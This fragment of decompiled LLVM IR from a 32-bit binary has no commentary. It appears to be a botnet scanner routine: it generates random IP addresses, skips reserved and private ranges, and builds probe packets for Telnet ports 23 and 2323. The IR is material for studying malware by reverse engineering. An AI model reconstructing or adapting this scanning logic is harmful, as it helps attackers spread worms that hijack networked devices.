  %v2_804da73 = inttoptr i32 %v1_804da73 to i32*
  %v3_804da73 = load i32, i32* %v2_804da73, align 4
  %v15_804da73 = icmp eq i32 %v3_804da73, %v0_804da6d
  br i1 %v15_804da73, label %dec_label_pc_804ddbb, label %dec_label_pc_804da7d

dec_label_pc_804da7d:                             ; preds = %.loopexit
  %v1_804da7d = add i32 %v0_804da73, 1812
  store i32 %v1_804da7d, i32* @ebp, align 4
  %v1_804da84 = add i32 %v0_804da73, 1852
  %v2_804da84 = inttoptr i32 %v1_804da84 to i32*
  store i32 0, i32* %v2_804da84, align 4
  %v0_804dc7f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dc7f

dec_label_pc_804da94:                             ; preds = %dec_label_pc_804dcf3
  switch i8 %v2_804dcd6, label %dec_label_pc_804daaf [
    i8 -84, label %dec_label_pc_804dd40
    i8 100, label %dec_label_pc_804da9d.dec_label_pc_804dd0a_crit_edge
    i8 -87, label %dec_label_pc_804dd5b
  ]

dec_label_pc_804da9d.dec_label_pc_804dd0a_crit_edge: ; preds = %dec_label_pc_804da94
  %.pre = trunc i32 %v2_804dccd to i8
  br label %dec_label_pc_804dd0a

dec_label_pc_804daa6:                             ; preds = %dec_label_pc_804dd01
  %v11_804daa6 = icmp eq i8 %v2_804dcd6, -87
  br i1 %v11_804daa6, label %dec_label_pc_804dd5b, label %dec_label_pc_804daaf

dec_label_pc_804daaf:                             ; preds = %dec_label_pc_804da94, %dec_label_pc_804dd52, %dec_label_pc_804daa6
  %v0_804daaf = phi i32 [ %v0_804dd52, %dec_label_pc_804dd52 ], [ %v5_804dccb, %dec_label_pc_804daa6 ], [ %v5_804dccb, %dec_label_pc_804da94 ]
  %v0_804dac664 = phi i32 [ %v0_804dd49, %dec_label_pc_804dd52 ], [ %v2_804dccd, %dec_label_pc_804daa6 ], [ %v2_804dccd, %dec_label_pc_804da94 ]
  %v1_804daaf = trunc i32 %v0_804daaf to i8
  %v11_804daaf = icmp eq i8 %v1_804daaf, -58
  br i1 %v11_804daaf, label %dec_label_pc_804dd21, label %dec_label_pc_804dab8

dec_label_pc_804dab8:                             ; preds = %dec_label_pc_804dd5b, %dec_label_pc_804dd18, %dec_label_pc_804daaf
  %v0_804dab8 = phi i32 [ %v0_804dab871, %dec_label_pc_804dd5b ], [ %v5_804dccb, %dec_label_pc_804dd18 ], [ %v0_804daaf, %dec_label_pc_804daaf ]
  %v0_804dac663 = phi i32 [ %v0_804dd5b, %dec_label_pc_804dd5b ], [ %v2_804dccd, %dec_label_pc_804dd18 ], [ %v0_804dac664, %dec_label_pc_804daaf ]
  %v1_804dab8 = trunc i32 %v0_804dab8 to i8
  %tmp289 = icmp ult i8 %v1_804dab8, -32
  br i1 %tmp289, label %dec_label_pc_804dac1, label %dec_label_pc_804dcc0.preheader

dec_label_pc_804dac1:                             ; preds = %dec_label_pc_804dd0a, %dec_label_pc_804dd21, %dec_label_pc_804dd40.dec_label_pc_804dac1_crit_edge, %dec_label_pc_804dab8
  %v0_804db84 = phi i32 [ %v0_804dd49, %dec_label_pc_804dd40.dec_label_pc_804dac1_crit_edge ], [ %v0_804dac663, %dec_label_pc_804dab8 ], [ %v0_804dd2a, %dec_label_pc_804dd21 ], [ %v2_804dccd, %dec_label_pc_804dd0a ]
  %v0_804db92 = phi i32 [ %v0_804dac1.pre, %dec_label_pc_804dd40.dec_label_pc_804dac1_crit_edge ], [ %v0_804dab8, %dec_label_pc_804dab8 ], [ %v0_804dac160, %dec_label_pc_804dd21 ], [ %v5_804dccb, %dec_label_pc_804dd0a ]
  %v1_804dac1 = trunc i32 %v0_804db92 to i8
  %v10_804dac1 = icmp eq i8 %v1_804dac1, 106
  %tmp290 = and i32 %v0_804db84, 252
  %switch = icmp eq i32 %tmp290, 184
  %or.cond182 = and i1 %switch, %v10_804dac1
  br i1 %or.cond182, label %dec_label_pc_804dcc0.preheader, label %dec_label_pc_804daea

dec_label_pc_804daea:                             ; preds = %dec_label_pc_804dac1
  switch i8 %v1_804dac1, label %dec_label_pc_804db0e [
    i8 -106, label %dec_label_pc_804dd69
    i8 49, label %dec_label_pc_804dd89
    i8 -78, label %dec_label_pc_804dd7b
    i8 -96, label %dec_label_pc_804dd9b
  ]

dec_label_pc_804db0e:                             ; preds = %dec_label_pc_804dd89, %dec_label_pc_804dd69, %dec_label_pc_804daea, %dec_label_pc_804dd9b, %dec_label_pc_804dd7b
  %v1_804db0e = add i32 %v0_804db92, -6
  store i32 %v1_804db0e, i32* %eax.global-to-local, align 4
  %v1_804db11 = trunc i32 %v1_804db0e to i8
  %tmp291 = or i8 %v1_804db11, 1
  %tmp292 = icmp eq i8 %tmp291, 1
  br i1 %tmp292, label %dec_label_pc_804dcc0.preheader, label %switch.early.test

switch.early.test:                                ; preds = %dec_label_pc_804db0e
  switch i8 %v1_804dac1, label %dec_label_pc_804db7c [
    i8 -41, label %dec_label_pc_804dcc0.preheader
    i8 -42, label %dec_label_pc_804dcc0.preheader
    i8 55, label %dec_label_pc_804dcc0.preheader
    i8 33, label %dec_label_pc_804dcc0.preheader
    i8 30, label %dec_label_pc_804dcc0.preheader
    i8 29, label %dec_label_pc_804dcc0.preheader
    i8 28, label %dec_label_pc_804dcc0.preheader
    i8 26, label %dec_label_pc_804dcc0.preheader
    i8 22, label %dec_label_pc_804dcc0.preheader
    i8 21, label %dec_label_pc_804dcc0.preheader
    i8 11, label %dec_label_pc_804dcc0.preheader
  ]

dec_label_pc_804db7c:                             ; preds = %switch.early.test
  %v0_804db7e = load i32, i32* @edx, align 4
  store i16 0, i16* bitcast (i32* @global_var_8053a2a.10 to i16*), align 4
  %v1_804db84 = mul i32 %v0_804db84, 65536
  %v2_804db8f = and i32 %v1_804db84, 16711680
  %v2_804db92 = mul i32 %v0_804db92, 16777216
  %v1_804db7e = mul i32 %v0_804db7e, 256
  %v2_804db98 = or i32 %v2_804db8f, %v2_804db92
  %v0_804db9a = load i32, i32* @edi, align 4
  %v1_804db9c = urem i32 %v0_804db9a, 256
  store i32 %v1_804db9c, i32* %eax.global-to-local, align 4
  %v2_804dba1 = or i32 %v1_804db9c, %v2_804db98
  store i32 %v2_804dba1, i32* %ecx.global-to-local, align 4
  %v2_804dba3 = or i32 %v1_804db9c, %v1_804db7e
  %v1_804dba5 = load i32, i32* @esp, align 4
  %v2_804dba5 = add i32 %v1_804dba5, -4
  %v3_804dba5 = inttoptr i32 %v2_804dba5 to i32*
  store i32 %v2_804dba1, i32* %v3_804dba5, align 4
  %v1_804dba6 = trunc i32 %v2_804dba3 to i16
  %v2_804dba6 = call i16 @llvm.bswap.i16(i16 %v1_804dba6)
  %v3_804dba6 = zext i16 %v2_804dba6 to i32
  %v1_804dbaa = udiv i32 %v2_804db98, 65536
  %v2_804dbaa = mul nuw i32 %v3_804dba6, 65536
  %v1_804dbad = trunc i32 %v1_804dbaa to i16
  %v2_804dbad = call i16 @llvm.bswap.i16(i16 %v1_804dbad)
  %v3_804dbad = zext i16 %v2_804dbad to i32
  %v6_804dbad = or i32 %v2_804dbaa, %v3_804dbad
  store i32 %v6_804dbad, i32* %edx.global-to-local, align 4
  %v0_804dbb1 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804dbb1 = add i32 %v1_804dba5, -8
  %v3_804dbb1 = inttoptr i32 %v2_804dbb1 to i32*
  store i32 %v0_804dbb1, i32* %v3_804dbb1, align 4
  %v0_804dbb2 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804dbb2, i32* @global_var_8053a30.11, align 16
  %v1_804dbb8 = add i32 %v1_804dba5, -12
  %v2_804dbb8 = inttoptr i32 %v1_804dbb8 to i32*
  store i32 20, i32* %v2_804dbb8, align 4
  %v1_804dbba = add i32 %v1_804dba5, -16
  %v2_804dbba = inttoptr i32 %v1_804dbba to i32*
  store i32 ptrtoint (i32* @global_var_8053a20.12 to i32), i32* %v2_804dbba, align 4
  %v0_804dbbf = call i32 @function_804bd90()
  %v1_804dbbf = trunc i32 %v0_804dbbf to i16
  store i32 %v0_804dbbf, i32* %eax.global-to-local, align 4
  %v0_804dbc4 = load i32, i32* @esp, align 4
  %v1_804dbc4 = add i32 %v0_804dbc4, 1868
  %v2_804dbc4 = inttoptr i32 %v1_804dbc4 to i32*
  %v3_804dbc4 = load i32, i32* %v2_804dbc4, align 4
  store i16 %v1_804dbbf, i16* bitcast (i32* @global_var_8053a2a.10 to i16*), align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_804dbda = ashr i32 %v3_804dbc4, 31
  %v2_804dbe0 = zext i32 %v3_804dbc4 to i64
  %v4_804dbe0 = zext i32 %v2_804dbda to i64
  %v5_804dbe0 = mul nuw i64 %v4_804dbe0, 4294967296
  %v6_804dbe0 = or i64 %v5_804dbe0, %v2_804dbe0
  %v10_804dbe0 = srem i64 %v6_804dbe0, 10
  %v11_804dbe0 = trunc i64 %v10_804dbe0 to i32
  store i32 %v11_804dbe0, i32* %edx.global-to-local, align 4
  %v1_804dbe2 = icmp eq i32 %v11_804dbe0, 0
  %v1_804dbe4 = icmp eq i1 %v1_804dbe2, false
  %. = select i1 %v1_804dbe4, i16 5888, i16 4873
  store i16 %., i16* @global_var_8053a36.13, align 2
  %v0_804dbf3 = load i32, i32* @global_var_8053a30.11, align 16
  store i32 %v0_804dbf3, i32* %eax.global-to-local, align 4
  %v1_804dbf8 = add i32 %v0_804dbc4, 12
  %v2_804dbf8 = inttoptr i32 %v1_804dbf8 to i32*
  store i32 20, i32* %v2_804dbf8, align 4
  %v0_804dbfa = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804dbfa, i32* @global_var_8053a38.14, align 8
  %v1_804dbff = add i32 %v0_804dbc4, 8
  %v2_804dbff = inttoptr i32 %v1_804dbff to i32*
  store i32 5120, i32* %v2_804dbff, align 4
  store i16 0, i16* bitcast (i32* @global_var_8053a44.15 to i16*), align 4
  %v1_804dc0d = add i32 %v0_804dbc4, 4
  %v2_804dc0d = inttoptr i32 %v1_804dc0d to i32*
  store i32 ptrtoint (i32* @global_var_8053a34.16 to i32), i32* %v2_804dc0d, align 4
  %v2_804dc12 = inttoptr i32 %v0_804dbc4 to i32*
  store i32 ptrtoint (i32* @global_var_8053a20.12 to i32), i32* %v2_804dc12, align 4
  %v0_804dc17 = call i32 @function_804bde0()
  %v1_804dc17 = trunc i32 %v0_804dc17 to i16
  store i16 %v1_804dc17, i16* bitcast (i32* @global_var_8053a44.15 to i16*), align 4
  %v0_804dc22 = load i32, i32* @global_var_8053a30.11, align 16
  store i32 %v0_804dc22, i32* %eax.global-to-local, align 4
  %v1_804dc27 = load i32, i32* @esp, align 4
  %v2_804dc27 = add i32 %v1_804dc27, 1832
  %v3_804dc27 = inttoptr i32 %v2_804dc27 to i32*
  store i32 %v0_804dc22, i32* %v3_804dc27, align 4
  %v0_804dc2e = load i16, i16* @global_var_8053a36.13, align 2
  %v1_804dc2e = zext i16 %v0_804dc2e to i32
  %v2_804dc2e = load i32, i32* %eax.global-to-local, align 4
  %v3_804dc2e = and i32 %v2_804dc2e, -65536
  %v4_804dc2e = or i32 %v3_804dc2e, %v1_804dc2e
  store i32 %v4_804dc2e, i32* %eax.global-to-local, align 4
  %v0_804dc34 = load i32, i32* @esp, align 4
  %v1_804dc34 = add i32 %v0_804dc34, 1828
  %v2_804dc34 = inttoptr i32 %v1_804dc34 to i16*
  store i16 2, i16* %v2_804dc34, align 2
  %v0_804dc3e = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc3e = trunc i32 %v0_804dc3e to i16
  %v2_804dc3e = load i32, i32* @esp, align 4
  %v3_804dc3e = add i32 %v2_804dc3e, 1830
  %v4_804dc3e = inttoptr i32 %v3_804dc3e to i16*
  store i16 %v1_804dc3e, i16* %v4_804dc3e, align 2
  %v0_804dc46 = load i32, i32* @esp, align 4
  %v1_804dc46 = inttoptr i32 %v0_804dc46 to i32*
  %v3_804dc46 = add i32 %v0_804dc46, 4
  %v0_804dc47 = load i32, i32* @global_var_8053a9c.17, align 4
  store i32 %v0_804dc47, i32* %eax.global-to-local, align 4
  %v1_804dc4c = inttoptr i32 %v3_804dc46 to i32*
  %v2_804dc4c = load i32, i32* %v1_804dc4c, align 4
  store i32 %v2_804dc4c, i32* %edx.global-to-local, align 4
  store i32 16, i32* %v1_804dc4c, align 4
  %v0_804dc4f = load i32, i32* @ebp, align 4
  store i32 %v0_804dc4f, i32* %v1_804dc46, align 4
  %v1_804dc50 = add i32 %v0_804dc46, -4
  %v2_804dc50 = inttoptr i32 %v1_804dc50 to i32*
  store i32 16384, i32* %v2_804dc50, align 4
  %v1_804dc55 = add i32 %v0_804dc46, -8
  %v2_804dc55 = inttoptr i32 %v1_804dc55 to i32*
  store i32 40, i32* %v2_804dc55, align 4
  %v1_804dc57 = add i32 %v0_804dc46, -12
  %v2_804dc57 = inttoptr i32 %v1_804dc57 to i32*
  store i32 ptrtoint (i32* @global_var_8053a20.12 to i32), i32* %v2_804dc57, align 4
  %v0_804dc5c = load i32, i32* %eax.global-to-local, align 4
  %v2_804dc5c = add i32 %v0_804dc46, -16
  %v3_804dc5c = inttoptr i32 %v2_804dc5c to i32*
  store i32 %v0_804dc5c, i32* %v3_804dc5c, align 4
  %v0_804dc5d = call i32 @function_8050026()
  store i32 %v0_804dc5d, i32* %eax.global-to-local, align 4
  %v0_804dc62 = load i32, i32* @esp, align 4
  %v1_804dc62 = add i32 %v0_804dc62, 1884
  %v2_804dc62 = inttoptr i32 %v1_804dc62 to i32*
  %v3_804dc62 = load i32, i32* %v2_804dc62, align 4
  %v1_804dc69 = add i32 %v3_804dc62, 1
  store i32 %v1_804dc69, i32* %eax.global-to-local, align 4
  store i32 %v1_804dc69, i32* %v2_804dc62, align 4
  %v0_804dc71 = load i32, i32* @esp, align 4
  %v1_804dc71 = add i32 %v0_804dc71, 32
  %v0_804dc74 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc74 = add i32 %v0_804dc74, -383
  %v6_804dc74 = sub i32 382, %v0_804dc74
  %v7_804dc74 = and i32 %v6_804dc74, %v0_804dc74
  %v8_804dc74 = icmp slt i32 %v7_804dc74, 0
  %v9_804dc74 = icmp eq i32 %v1_804dc74, 0
  %v10_804dc74 = icmp slt i32 %v1_804dc74, 0
  %v3_804dc79 = icmp eq i1 %v10_804dc74, %v8_804dc74
  %v4_804dc79 = icmp eq i1 %v9_804dc74, false
  %v5_804dc79 = and i1 %v4_804dc79, %v3_804dc79
  br i1 %v5_804dc79, label %dec_label_pc_804ddb7, label %dec_label_pc_804dc7f

dec_label_pc_804dc7f:                             ; preds = %dec_label_pc_804db7c, %dec_label_pc_804da7d
  %v0_804dc7f = phi i32 [ %v1_804dc71, %dec_label_pc_804db7c ], [ %v0_804dc7f.pre, %dec_label_pc_804da7d ]
  %v1_804dc7f = add i32 %v0_804dc7f, 1812
  %v2_804dc7f = inttoptr i32 %v1_804dc7f to i32*
  store i32 0, i32* %v2_804dc7f, align 4
  %v0_804dc8a = load i32, i32* @esp, align 4
  %v1_804dc8a = add i32 %v0_804dc8a, 1816
  %v2_804dc8a = inttoptr i32 %v1_804dc8a to i32*
  store i32 0, i32* %v2_804dc8a, align 4
  %v0_804dc95 = load i32, i32* @esp, align 4
  %v1_804dc95 = add i32 %v0_804dc95, 1820
  %v2_804dc95 = inttoptr i32 %v1_804dc95 to i32*
  store i32 0, i32* %v2_804dc95, align 4
  %v0_804dca0 = load i32, i32* @esp, align 4
  %v1_804dca0 = add i32 %v0_804dca0, 1824
  %v2_804dca0 = inttoptr i32 %v1_804dca0 to i32*
  store i32 0, i32* %v2_804dca0, align 4
  %v0_804dcab = call i32 @function_804d350()
  %v1_804dcab = trunc i32 %v0_804dcab to i16
  store i16 %v1_804dcab, i16* bitcast (i32* @global_var_8053a24.18 to i16*), align 4
  %v0_804dcb6 = load i32, i32* @global_var_8053a7c.19, align 4
  store i32 %v0_804dcb6, i32* %eax.global-to-local, align 4
  store i32 %v0_804dcb6, i32* @global_var_8053a2c.20, align 4
  br label %dec_label_pc_804dcc0.preheader

dec_label_pc_804dcc0.preheader:                   ; preds = %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %dec_label_pc_804db0e, %dec_label_pc_804dac1, %dec_label_pc_804dd21, %dec_label_pc_804dc7f, %dec_label_pc_804dd49, %dec_label_pc_804dd69, %dec_label_pc_804dd89, %dec_label_pc_804dab8, %dec_label_pc_804dd5b, %dec_label_pc_804dd7b, %dec_label_pc_804dd9b
  br label %dec_label_pc_804dcc0

dec_label_pc_804dcc0:                             ; preds = %switch.early.test288, %switch.early.test288, %dec_label_pc_804dce2, %dec_label_pc_804dcc0, %dec_label_pc_804dcc0, %dec_label_pc_804dcc0, %dec_label_pc_804dd13, %dec_label_pc_804dcfc, %dec_label_pc_804dcc0.preheader
  %v0_804dcc0 = call i32 @function_804d350()
  store i32 %v0_804dcc0, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_804dcc0, 65536
  %v1_804dcc5 = sdiv i32 %sext, 65536
  %v2_804dccb = urem i32 %v0_804dcc0, 256
  %v3_804dccb = load i32, i32* @ecx, align 4
  %v4_804dccb = and i32 %v3_804dccb, -256
  %v5_804dccb = or i32 %v4_804dccb, %v2_804dccb
  store i32 %v5_804dccb, i32* @ecx, align 4
  %v2_804dccd = udiv i32 %v1_804dcc5, 256
  store i32 %v2_804dccd, i32* @ebx, align 4
  %v2_804dcd0 = udiv i32 %v1_804dcc5, 65536
  store i32 %v2_804dcd0, i32* @edx, align 4
  %v2_804dcd3 = udiv i32 %v1_804dcc5, 16777216
  store i32 %v2_804dcd3, i32* @edi, align 4
  %v2_804dcd6 = trunc i32 %v0_804dcc0 to i8
  switch i8 %v2_804dcd6, label %dec_label_pc_804dce2 [
    i8 127, label %dec_label_pc_804dcc0
    i8 0, label %dec_label_pc_804dcc0
    i8 3, label %dec_label_pc_804dcc0
  ]

dec_label_pc_804dce2:                             ; preds = %dec_label_pc_804dcc0
  %v2_804dce2 = add nsw i32 %v1_804dcc5, -15
  store i32 %v2_804dce2, i32* %eax.global-to-local, align 4
  %v1_804dce5 = trunc i32 %v2_804dce2 to i8
  %tmp293 = or i8 %v1_804dce5, 1
  %tmp294 = icmp eq i8 %tmp293, 1
  br i1 %tmp294, label %dec_label_pc_804dcc0, label %switch.early.test288

switch.early.test288:                             ; preds = %dec_label_pc_804dce2
  switch i8 %v2_804dcd6, label %dec_label_pc_804dcf3 [
    i8 56, label %dec_label_pc_804dcc0
    i8 10, label %dec_label_pc_804dcc0
  ]

dec_label_pc_804dcf3:                             ; preds = %switch.early.test288
  %v8_804dcf3 = icmp eq i8 %v2_804dcd6, -64
  %v1_804dcf6 = icmp eq i1 %v8_804dcf3, false
  br i1 %v1_804dcf6, label %dec_label_pc_804da94, label %dec_label_pc_804dcfc

dec_label_pc_804dcfc:                             ; preds = %dec_label_pc_804dcf3
  %v1_804dcfc = trunc i32 %v2_804dccd to i8
  %v11_804dcfc = icmp eq i8 %v1_804dcfc, -88
  br i1 %v11_804dcfc, label %dec_label_pc_804dcc0, label %dec_label_pc_804dd01

dec_label_pc_804dd01:                             ; preds = %dec_label_pc_804dcfc
  %v10_804dd01 = icmp eq i8 %v2_804dcd6, 100
  %v1_804dd04 = icmp eq i1 %v10_804dd01, false
  br i1 %v1_804dd04, label %dec_label_pc_804daa6, label %dec_label_pc_804dd0a

dec_label_pc_804dd0a:                             ; preds = %dec_label_pc_804da9d.dec_label_pc_804dd0a_crit_edge, %dec_label_pc_804dd01
  %v1_804dd0a.pre-phi = phi i8 [ %.pre, %dec_label_pc_804da9d.dec_label_pc_804dd0a_crit_edge ], [ %v1_804dcfc, %dec_label_pc_804dd01 ]
  %tmp295 = icmp ult i8 %v1_804dd0a.pre-phi, 64
  br i1 %tmp295, label %dec_label_pc_804dac1, label %dec_label_pc_804dd13

dec_label_pc_804dd13:                             ; preds = %dec_label_pc_804dd0a
  %tmp296 = icmp ult i8 %v1_804dd0a.pre-phi, 127
  br i1 %tmp296, label %dec_label_pc_804dcc0, label %dec_label_pc_804dd18

dec_label_pc_804dd18:                             ; preds = %dec_label_pc_804dd13
  %v11_804dd18 = icmp eq i8 %v2_804dcd6, -58
  %v1_804dd1b = icmp eq i1 %v11_804dd18, false
  br i1 %v1_804dd1b, label %dec_label_pc_804dab8, label %dec_label_pc_804dd21

dec_label_pc_804dd21:                             ; preds = %dec_label_pc_804dd18, %dec_label_pc_804daaf
  %v0_804dd2a = phi i32 [ %v2_804dccd, %dec_label_pc_804dd18 ], [ %v0_804dac664, %dec_label_pc_804daaf ]
  %v0_804dac160 = phi i32 [ %v5_804dccb, %dec_label_pc_804dd18 ], [ %v0_804daaf, %dec_label_pc_804daaf ]
  %v1_804dd21 = trunc i32 %v0_804dd2a to i8
  %tmp297 = icmp ugt i8 %v1_804dd21, 17
  %tmp298 = or i8 %v1_804dd21, 1
  %tmp299 = icmp eq i8 %tmp298, 19
  %or.cond162 = and i1 %tmp297, %tmp299
  br i1 %or.cond162, label %dec_label_pc_804dcc0.preheader, label %dec_label_pc_804dac1

dec_label_pc_804dd34:                             ; preds = %dec_label_pc_804eb67
  store i32 0, i32* %v2_804dd37, align 4
  %v1_804dd39 = call i32 @function_80513e0(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804dd39, i32* %eax.global-to-local, align 4
  %v0_804dd40.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804dd40

dec_label_pc_804dd40:                             ; preds = %dec_label_pc_804da94, %dec_label_pc_804dd34
  %v0_804dd49 = phi i32 [ %v0_804dd40.pre, %dec_label_pc_804dd34 ], [ %v2_804dccd, %dec_label_pc_804da94 ]
  %v1_804dd40 = trunc i32 %v0_804dd49 to i8
  %tmp300 = icmp ult i8 %v1_804dd40, 16
  br i1 %tmp300, label %dec_label_pc_804dd40.dec_label_pc_804dac1_crit_edge, label %dec_label_pc_804dd49

dec_label_pc_804dd40.dec_label_pc_804dac1_crit_edge: ; preds = %dec_label_pc_804dd40
  %v0_804dac1.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804dac1

dec_label_pc_804dd49:                             ; preds = %dec_label_pc_804dd40
  %tmp301 = icmp ult i8 %v1_804dd40, 32
  br i1 %tmp301, label %dec_label_pc_804dcc0.preheader, label %dec_label_pc_804dd52

dec_label_pc_804dd52:                             ; preds = %dec_label_pc_804dd49
  %v0_804dd52 = load i32, i32* @ecx, align 4
  %v1_804dd52 = trunc i32 %v0_804dd52 to i8
  %v11_804dd52 = icmp eq i8 %v1_804dd52, -87
  %v1_804dd55 = icmp eq i1 %v11_804dd52, false
  br i1 %v1_804dd55, label %dec_label_pc_804daaf, label %dec_label_pc_804dd5b

dec_label_pc_804dd5b:                             ; preds = %dec_label_pc_804da94, %dec_label_pc_804dd52, %dec_label_pc_804daa6
  %v0_804dab871 = phi i32 [ %v0_804dd52, %dec_label_pc_804dd52 ], [ %v5_804dccb, %dec_label_pc_804daa6 ], [ %v5_804dccb, %dec_label_pc_804da94 ]
  %v0_804dd5b = phi i32 [ %v0_804dd49, %dec_label_pc_804dd52 ], [ %v2_804dccd, %dec_label_pc_804daa6 ], [ %v2_804dccd, %dec_label_pc_804da94 ]
  %v1_804dd5b = trunc i32 %v0_804dd5b to i8
  %v11_804dd5b = icmp eq i8 %v1_804dd5b, -1
  %v1_804dd5e = icmp eq i1 %v11_804dd5b, false
  br i1 %v1_804dd5e, label %dec_label_pc_804dab8, label %dec_label_pc_804dcc0.preheader

dec_label_pc_804dd69:                             ; preds = %dec_label_pc_804daea
  %v1_804dd69 = trunc i32 %v0_804db84 to i8
  %v10_804dd69 = icmp eq i8 %v1_804dd69, 31
  br i1 %v10_804dd69, label %dec_label_pc_804dcc0.preheader, label %dec_label_pc_804db0e

dec_label_pc_804dd7b:                             ; preds = %dec_label_pc_804daea
  %.pre127 = trunc i32 %v0_804db84 to i8
  %v10_804dd7b = icmp eq i8 %.pre127, 62
  %v1_804dd7e = icmp eq i1 %v10_804dd7b, false
  br i1 %v1_804dd7e, label %dec_label_pc_804db0e, label %dec_label_pc_804dcc0.preheader

dec_label_pc_804dd89:                             ; preds = %dec_label_pc_804daea
  %v1_804dd89 = trunc i32 %v0_804db84 to i8
  %v10_804dd89 = icmp eq i8 %v1_804dd89, 51
  br i1 %v10_804dd89, label %dec_label_pc_804dcc0.preheader, label %dec_label_pc_804db0e

dec_label_pc_804dd9b:                             ; preds = %dec_label_pc_804daea
  %.pre126 = trunc i32 %v0_804db84 to i8
  %v10_804dd9b = icmp eq i8 %.pre126, 13
  %v1_804dd9e = icmp eq i1 %v10_804dd9b, false
  br i1 %v1_804dd9e, label %dec_label_pc_804db0e, label %dec_label_pc_804dcc0.preheader

dec_label_pc_804ddb7:                             ; preds = %dec_label_pc_804db7c
  %v0_804ddb7 = load i32, i32* @esi, align 4
  %v2_804ddb7 = add i32 %v0_804dc71, 48
  %v3_804ddb7 = inttoptr i32 %v2_804ddb7 to i32*
  store i32 %v0_804ddb7, i32* %v3_804ddb7, align 4
  br label %dec_label_pc_804ddbb

dec_label_pc_804ddbb:                             ; preds = %.loopexit, %dec_label_pc_804ddb7
  %v1_804ddbb = call i32 @function_804fe1b(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ddbb, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804ddc2 = load i32, i32* @esp, align 4
  %v2_804ddc2 = add i32 %v1_804ddc2, 24
  %v3_804ddc2 = inttoptr i32 %v2_804ddc2 to i32*
  store i32 %v1_804ddbb, i32* %v3_804ddc2, align 4
  br label %dec_label_pc_804ddc6

dec_label_pc_804ddc6:                             ; preds = %dec_label_pc_804de21, %dec_label_pc_804de63, %dec_label_pc_804de5b, %dec_label_pc_804de53, %dec_label_pc_804de3f, %dec_label_pc_804de33, %dec_label_pc_804de1a, %dec_label_pc_804de0e, %dec_label_pc_804de09, %dec_label_pc_804dec5, %dec_label_pc_804ddbb
  %v0_804ddc6 = load i32, i32* @esp, align 4
  %v1_804ddc6 = add i32 %v0_804ddc6, 24
  %v2_804ddc6 = inttoptr i32 %v1_804ddc6 to i32*
  %v3_804ddc6 = load i32, i32* %v2_804ddc6, align 4
  store i32 %v3_804ddc6, i32* %eax.global-to-local, align 4
  %v1_804ddca = inttoptr i32 %v3_804ddc6 to i32*
  store i32 0, i32* %v1_804ddca, align 4
  %v0_804ddd0 = load i32, i32* @edi, align 4
  %v1_804ddd0 = load i32, i32* @esp, align 4
  %v2_804ddd0 = add i32 %v1_804ddd0, -4
  %v3_804ddd0 = inttoptr i32 %v2_804ddd0 to i32*
  store i32 %v0_804ddd0, i32* %v3_804ddd0, align 4
  %v0_804ddd1 = load i32, i32* @edi, align 4
  %v2_804ddd1 = add i32 %v1_804ddd0, -8
  %v3_804ddd1 = inttoptr i32 %v2_804ddd1 to i32*
  store i32 %v0_804ddd1, i32* %v3_804ddd1, align 4
  %v1_804ddd2 = add i32 %v1_804ddd0, -12
  %v2_804ddd2 = inttoptr i32 %v1_804ddd2 to i32*
  store i32 0, i32* %v2_804ddd2, align 4
  %v1_804ddd4 = add i32 %v1_804ddd0, -16
  %v2_804ddd4 = inttoptr i32 %v1_804ddd4 to i32*
  store i32 0, i32* %v2_804ddd4, align 4
  %v1_804ddd6 = add i32 %v1_804ddd0, -20
  %v2_804ddd6 = inttoptr i32 %v1_804ddd6 to i32*
  store i32 16384, i32* %v2_804ddd6, align 4
  %v1_804dddb = add i32 %v1_804ddd0, -24
  %v2_804dddb = inttoptr i32 %v1_804dddb to i32*
  store i32 1514, i32* %v2_804dddb, align 4
  %v0_804dde0 = load i32, i32* @global_var_8053a9c.17, align 4
  store i32 %v0_804dde0, i32* %esi.global-to-local, align 4
  %v1_804dde6 = add i32 %v1_804ddd0, 42
  store i32 %v1_804dde6, i32* %edx.global-to-local, align 4
  %v2_804ddea = add i32 %v1_804ddd0, -28
  %v3_804ddea = inttoptr i32 %v2_804ddea to i32*
  store i32 %v1_804dde6, i32* %v3_804ddea, align 4
  %v0_804ddeb = load i32, i32* %esi.global-to-local, align 4
  %v2_804ddeb = add i32 %v1_804ddd0, -32
  %v3_804ddeb = inttoptr i32 %v2_804ddeb to i32*
  store i32 %v0_804ddeb, i32* %v3_804ddeb, align 4
  %v0_804ddec = call i32 @function_804ffb0()
  store i32 %v0_804ddec, i32* %eax.global-to-local, align 4
  %v0_804ddf1 = load i32, i32* @esp, align 4
  %tmp = icmp slt i32 %v0_804ddec, 1
  br i1 %tmp, label %dec_label_pc_804ded6, label %dec_label_pc_804ddfc

dec_label_pc_804ddfc:                             ; preds = %dec_label_pc_804ddc6
  %v1_804ddfc = add i32 %v0_804ddf1, 56
  %v2_804ddfc = inttoptr i32 %v1_804ddfc to i32*
  %v3_804ddfc = load i32, i32* %v2_804ddfc, align 4
  store i32 %v3_804ddfc, i32* %ecx.global-to-local, align 4
  %v1_804de00 = inttoptr i32 %v3_804ddfc to i32*
  %v2_804de00 = load i32, i32* %v1_804de00, align 4
  %v11_804de00 = icmp eq i32 %v2_804de00, 11
  br i1 %v11_804de00, label %dec_label_pc_804ded6, label %dec_label_pc_804de09

dec_label_pc_804de09:                             ; preds = %dec_label_pc_804ddfc
  %tmp302 = icmp ult i32 %v0_804ddec, 40
  br i1 %tmp302, label %dec_label_pc_804ddc6, label %dec_label_pc_804de0e

dec_label_pc_804de0e:                             ; preds = %dec_label_pc_804de09
  %v1_804de0e = add i32 %v0_804ddf1, 90
  %v2_804de0e = inttoptr i32 %v1_804de0e to i32*
